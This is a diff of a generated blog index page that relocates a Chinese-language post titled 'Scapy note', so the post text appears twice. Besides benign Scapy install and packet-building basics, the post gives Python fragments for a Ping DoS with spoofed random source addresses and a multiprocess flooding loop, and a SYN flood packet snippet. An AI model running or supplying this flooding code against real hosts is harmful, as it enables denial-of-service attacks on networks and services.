@@ -2049,317 +2049,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/note_scapy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="CheUhxg">
-      <meta itemprop="description" content="C0py for Coding">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CheUhxg's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/17/note_scapy/" class="post-title-link" itemprop="url">Scapy note</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-05-17 17:02:40 / Modified: 19:40:43" itemprop="dateCreated datePublished" datetime="2022-05-17T17:02:40+08:00">2022-05-17</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul>
-<li>首先给出<a target="_blank" rel="noopener" href="https://scapy.net/">官网</a>。</li>
-<li><code>Scapy</code>是用<code>Python</code>编写的交互式数据包处理工具。</li>
-<li>使用<code>Scapy</code>可以伪造或解码各种协议的数据包，在线发送它们，捕获它们，匹配请求和答复等等。 </li>
-</ul>
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ul>
-<li>由于是<code>Python</code>编写的，使用<code>pip install</code>进行安装，这里使用清华源加速。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install scapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-<ul>
-<li>直接使用<code>scapy</code>命令打开，若显示无法导入相关库，则对其中缺失的相关包进行安装。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INFO: Can<span class="string">&#x27;t import matplotlib. Won&#x27;</span>t be able to plot.</span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br></pre></td></tr></table></figure>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="包配置"><a href="#包配置" class="headerlink" title="包配置"></a>包配置</h2><ul>
-<li>使用<code>TCP/IP</code>协议构造基本数据包，这里调用了<code>Scapy</code>的内置函数<code>IP()</code>和<code>TCP()</code>。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = IP()/TCP()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><font color="red">注意</font>：<code>IP()</code>一定在<code>TCP()</code>之前。</p>
-<p><code>IP()</code>参数解析</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>version</td>
-<td>版本</td>
-<td>4</td>
-</tr>
-<tr>
-<td>ihl</td>
-<td>报头长度</td>
-<td>None</td>
-</tr>
-<tr>
-<td>tos</td>
-<td>服务类型</td>
-<td>0x0</td>
-</tr>
-<tr>
-<td>len</td>
-<td>报文总长度</td>
-<td>None</td>
-</tr>
-<tr>
-<td>id</td>
-<td>标识符</td>
-<td>1</td>
-</tr>
-<tr>
-<td>flags</td>
-<td>标记</td>
-<td>NULL</td>
-</tr>
-<tr>
-<td>frag</td>
-<td>段偏移</td>
-<td>0</td>
-</tr>
-<tr>
-<td>ttl</td>
-<td>生存周期</td>
-<td>64</td>
-</tr>
-<tr>
-<td>proto</td>
-<td>协议</td>
-<td>tcp</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>src</td>
-<td>源<code>IP</code>地址</td>
-<td>127.0.0.1</td>
-</tr>
-<tr>
-<td>dst</td>
-<td>目的<code>IP</code>地址</td>
-<td>127.0.0.1</td>
-</tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p><code>TCP()</code>参数解析</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>sport</td>
-<td>源端口</td>
-<td>ftp_data</td>
-</tr>
-<tr>
-<td>dport</td>
-<td>目的端口</td>
-<td>http</td>
-</tr>
-<tr>
-<td>seq</td>
-<td>序号</td>
-<td>0</td>
-</tr>
-<tr>
-<td>ack</td>
-<td>确认号</td>
-<td>0</td>
-</tr>
-<tr>
-<td>dataofs</td>
-<td>数据偏移</td>
-<td>None</td>
-</tr>
-<tr>
-<td>reserved</td>
-<td>保留位</td>
-<td>0</td>
-</tr>
-<tr>
-<td>flags</td>
-<td>控制功能</td>
-<td>S</td>
-</tr>
-<tr>
-<td>window</td>
-<td>窗口大小</td>
-<td>8192</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>urgptr</td>
-<td>紧急指针</td>
-<td>0</td>
-</tr>
-<tr>
-<td>options</td>
-<td>选项</td>
-<td>[]</td>
-</tr>
-</tbody>
-</table>
-</div>
-<ul>
-<li>根据需求设置数据包之后，使用<code>&#123;PKT_NAME&#125;.show()</code>可以查看报文信息。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 192.168.239.128</span><br><span class="line">  dst= 110.242.68.4</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br></pre></td></tr></table></figure>
-<h2 id="包发送"><a href="#包发送" class="headerlink" title="包发送"></a>包发送</h2><ul>
-<li>使用<code>send()</code>函数发送数据包，该函数不返回响应。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><code>sendp()</code>等加了<code>p</code>的函数作用于第二层，发送的是帧。</p>
-</blockquote>
-<ul>
-<li><code>sr()</code>和<code>sr1()</code>发送数据包并接收响应。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; res, unans = sr(pkt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; res</span><br><span class="line">&lt;Results: TCP:1 UDP:0 ICMP:0 Other:0&gt;</span><br><span class="line">&gt;&gt;&gt; unans</span><br><span class="line">&lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><code>sr()</code>和<code>sr1()</code>的区别在于，<code>sr1()</code>只有一个返回值（<code>Results</code>）。</p>
-</blockquote>
-<h2 id="Ping-DoS"><a href="#Ping-DoS" class="headerlink" title="Ping DoS"></a>Ping DoS</h2><ul>
-<li>使用<code>Ping</code>进行<code>DoS</code>攻击时，由于<code>Ping</code>使用的是<code>ICMP</code>协议，下面给出<code>ICMP()</code>的参数解析。</li>
-</ul>
-<blockquote>
-<p><code>ICMP()</code>参数解析</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>type</td>
-<td>消息类型</td>
-<td>echo-request</td>
-</tr>
-<tr>
-<td>code</td>
-<td>代码</td>
-<td>0</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>id</td>
-<td>标识</td>
-<td>0x0</td>
-</tr>
-<tr>
-<td>seq</td>
-<td>序号</td>
-<td>0x0</td>
-</tr>
-</tbody>
-</table>
-</div>
-<ul>
-<li><code>Ping</code>攻击报文的设置比较简单，通过随机配置<code>ICMP()</code>也能实现<code>Ping DoS</code>的攻击效果。</li>
-<li>结合<code>IP()</code>设置目标主机<code>IP</code>。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断是否随机源</span></span><br><span class="line"><span class="keyword">if</span> random_source ==<span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#随机构造IP</span></span><br><span class="line">    source_ip = Random_IP()</span><br><span class="line"></span><br><span class="line">    ip_proto = IP(src = source_ip,</span><br><span class="line">                  dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip_proto = IP(dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line">	<span class="comment">#id_ping和seq_ping均为随机配置</span></span><br><span class="line">    icmp_proto = ICMP(<span class="built_in">id</span> = id_ping,</span><br><span class="line">                      seq = seq_ping)</span><br><span class="line">    <span class="comment">#设置数据内容</span></span><br><span class="line">    data = <span class="string">b&#x27;ping dos&#x27;</span></span><br><span class="line">	</span><br><span class="line">    pkt = ip_proto / icmp_proto / data *<span class="number">100</span></span><br><span class="line">    send(pkt)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在这基础上，要想达到效果，我们需要增加攻击报文的量。</li>
-<li>通过循环重复攻击之外，我们采用多进程并发的方式增大攻击频率。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#processes设置太高会影响本机运作，太低起不到干扰效果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping_concurrent</span>(<span class="params">host, processes=<span class="number">5</span>, random_source=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment">#创建进程池</span></span><br><span class="line">    pool = multiprocessing.Pool(processes=processes)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#选择进程的任务和参数</span></span><br><span class="line">            pool.apply_async(ping_times, (host, random_source))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            pool.terminate()</span><br></pre></td></tr></table></figure>
-<h2 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN_Flood"></a>SYN_Flood</h2><ul>
-<li>多进程和重复次数的性质和<code>Ping DoS</code>一致，这里主要的区别在于把<code>ICMP</code>协议换成了<code>TCP</code>协议。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Randomly generate source port</span></span><br><span class="line">src_port = randint(<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">tcp_proto = TCP(sport = src_port,</span><br><span class="line">                dport = port,</span><br><span class="line">                flags = <span class="string">&quot;S&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = ip_proto / tcp_proto</span><br></pre></td></tr></table></figure>
-<ul>
-<li>其中<code>flags</code>变量表示了<code>TCP</code>三次握手的不同状态，<code>S</code>表示<code>SYN</code>。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/note_effective_cpp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2986,6 +2675,317 @@
 <li><strong>只约束成员版</strong>，因为swap缺省版本以<strong>拷贝构造函数和拷贝赋值操作符</strong>为基础，而这两者都允许抛出异常。</li>
 </ul>
 </li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/note_scapy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="CheUhxg">
+      <meta itemprop="description" content="C0py for Coding">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CheUhxg's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/17/note_scapy/" class="post-title-link" itemprop="url">Scapy note</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-17 17:02:40 / Modified: 19:40:43" itemprop="dateCreated datePublished" datetime="2022-05-17T17:02:40+08:00">2022-05-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul>
+<li>首先给出<a target="_blank" rel="noopener" href="https://scapy.net/">官网</a>。</li>
+<li><code>Scapy</code>是用<code>Python</code>编写的交互式数据包处理工具。</li>
+<li>使用<code>Scapy</code>可以伪造或解码各种协议的数据包，在线发送它们，捕获它们，匹配请求和答复等等。 </li>
+</ul>
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ul>
+<li>由于是<code>Python</code>编写的，使用<code>pip install</code>进行安装，这里使用清华源加速。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install scapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接使用<code>scapy</code>命令打开，若显示无法导入相关库，则对其中缺失的相关包进行安装。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INFO: Can<span class="string">&#x27;t import matplotlib. Won&#x27;</span>t be able to plot.</span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br></pre></td></tr></table></figure>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="包配置"><a href="#包配置" class="headerlink" title="包配置"></a>包配置</h2><ul>
+<li>使用<code>TCP/IP</code>协议构造基本数据包，这里调用了<code>Scapy</code>的内置函数<code>IP()</code>和<code>TCP()</code>。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = IP()/TCP()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><font color="red">注意</font>：<code>IP()</code>一定在<code>TCP()</code>之前。</p>
+<p><code>IP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>version</td>
+<td>版本</td>
+<td>4</td>
+</tr>
+<tr>
+<td>ihl</td>
+<td>报头长度</td>
+<td>None</td>
+</tr>
+<tr>
+<td>tos</td>
+<td>服务类型</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>len</td>
+<td>报文总长度</td>
+<td>None</td>
+</tr>
+<tr>
+<td>id</td>
+<td>标识符</td>
+<td>1</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>标记</td>
+<td>NULL</td>
+</tr>
+<tr>
+<td>frag</td>
+<td>段偏移</td>
+<td>0</td>
+</tr>
+<tr>
+<td>ttl</td>
+<td>生存周期</td>
+<td>64</td>
+</tr>
+<tr>
+<td>proto</td>
+<td>协议</td>
+<td>tcp</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>src</td>
+<td>源<code>IP</code>地址</td>
+<td>127.0.0.1</td>
+</tr>
+<tr>
+<td>dst</td>
+<td>目的<code>IP</code>地址</td>
+<td>127.0.0.1</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p><code>TCP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sport</td>
+<td>源端口</td>
+<td>ftp_data</td>
+</tr>
+<tr>
+<td>dport</td>
+<td>目的端口</td>
+<td>http</td>
+</tr>
+<tr>
+<td>seq</td>
+<td>序号</td>
+<td>0</td>
+</tr>
+<tr>
+<td>ack</td>
+<td>确认号</td>
+<td>0</td>
+</tr>
+<tr>
+<td>dataofs</td>
+<td>数据偏移</td>
+<td>None</td>
+</tr>
+<tr>
+<td>reserved</td>
+<td>保留位</td>
+<td>0</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>控制功能</td>
+<td>S</td>
+</tr>
+<tr>
+<td>window</td>
+<td>窗口大小</td>
+<td>8192</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>urgptr</td>
+<td>紧急指针</td>
+<td>0</td>
+</tr>
+<tr>
+<td>options</td>
+<td>选项</td>
+<td>[]</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>根据需求设置数据包之后，使用<code>&#123;PKT_NAME&#125;.show()</code>可以查看报文信息。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 192.168.239.128</span><br><span class="line">  dst= 110.242.68.4</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br></pre></td></tr></table></figure>
+<h2 id="包发送"><a href="#包发送" class="headerlink" title="包发送"></a>包发送</h2><ul>
+<li>使用<code>send()</code>函数发送数据包，该函数不返回响应。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>sendp()</code>等加了<code>p</code>的函数作用于第二层，发送的是帧。</p>
+</blockquote>
+<ul>
+<li><code>sr()</code>和<code>sr1()</code>发送数据包并接收响应。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; res, unans = sr(pkt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; res</span><br><span class="line">&lt;Results: TCP:1 UDP:0 ICMP:0 Other:0&gt;</span><br><span class="line">&gt;&gt;&gt; unans</span><br><span class="line">&lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>sr()</code>和<code>sr1()</code>的区别在于，<code>sr1()</code>只有一个返回值（<code>Results</code>）。</p>
+</blockquote>
+<h2 id="Ping-DoS"><a href="#Ping-DoS" class="headerlink" title="Ping DoS"></a>Ping DoS</h2><ul>
+<li>使用<code>Ping</code>进行<code>DoS</code>攻击时，由于<code>Ping</code>使用的是<code>ICMP</code>协议，下面给出<code>ICMP()</code>的参数解析。</li>
+</ul>
+<blockquote>
+<p><code>ICMP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>消息类型</td>
+<td>echo-request</td>
+</tr>
+<tr>
+<td>code</td>
+<td>代码</td>
+<td>0</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>id</td>
+<td>标识</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>seq</td>
+<td>序号</td>
+<td>0x0</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><code>Ping</code>攻击报文的设置比较简单，通过随机配置<code>ICMP()</code>也能实现<code>Ping DoS</code>的攻击效果。</li>
+<li>结合<code>IP()</code>设置目标主机<code>IP</code>。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断是否随机源</span></span><br><span class="line"><span class="keyword">if</span> random_source ==<span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#随机构造IP</span></span><br><span class="line">    source_ip = Random_IP()</span><br><span class="line"></span><br><span class="line">    ip_proto = IP(src = source_ip,</span><br><span class="line">                  dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip_proto = IP(dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line">	<span class="comment">#id_ping和seq_ping均为随机配置</span></span><br><span class="line">    icmp_proto = ICMP(<span class="built_in">id</span> = id_ping,</span><br><span class="line">                      seq = seq_ping)</span><br><span class="line">    <span class="comment">#设置数据内容</span></span><br><span class="line">    data = <span class="string">b&#x27;ping dos&#x27;</span></span><br><span class="line">	</span><br><span class="line">    pkt = ip_proto / icmp_proto / data *<span class="number">100</span></span><br><span class="line">    send(pkt)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在这基础上，要想达到效果，我们需要增加攻击报文的量。</li>
+<li>通过循环重复攻击之外，我们采用多进程并发的方式增大攻击频率。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#processes设置太高会影响本机运作，太低起不到干扰效果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping_concurrent</span>(<span class="params">host, processes=<span class="number">5</span>, random_source=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment">#创建进程池</span></span><br><span class="line">    pool = multiprocessing.Pool(processes=processes)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#选择进程的任务和参数</span></span><br><span class="line">            pool.apply_async(ping_times, (host, random_source))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            pool.terminate()</span><br></pre></td></tr></table></figure>
+<h2 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN_Flood"></a>SYN_Flood</h2><ul>
+<li>多进程和重复次数的性质和<code>Ping DoS</code>一致，这里主要的区别在于把<code>ICMP</code>协议换成了<code>TCP</code>协议。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Randomly generate source port</span></span><br><span class="line">src_port = randint(<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">tcp_proto = TCP(sport = src_port,</span><br><span class="line">                dport = port,</span><br><span class="line">                flags = <span class="string">&quot;S&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = ip_proto / tcp_proto</span><br></pre></td></tr></table></figure>
+<ul>
